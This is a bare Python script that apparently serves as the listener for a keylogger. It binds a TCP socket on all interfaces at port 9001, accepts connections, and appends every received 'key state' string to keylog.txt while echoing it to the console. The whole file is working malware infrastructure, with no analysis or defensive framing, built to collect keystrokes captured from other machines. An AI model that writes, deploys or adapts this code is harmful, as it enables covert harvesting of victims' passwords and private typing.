import socket

HOST = "0.0.0.0" # Listen on all interfaces
PORT = 9001 # Set port to listen on

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
  
print(f"[*] Listening on {HOST}:{PORT}")  

with open("keylog.txt", "a") as file:
	while True:	
		client, addr = server.accept()		
		while True:		
			try:			
				data = client.recv(1024).decode("utf-8")				
				if not data:				
					break				
				file.write(data)				
				file.flush()				
				print("> Received key state: "+ data)			
			except:			
				break		
		client.close()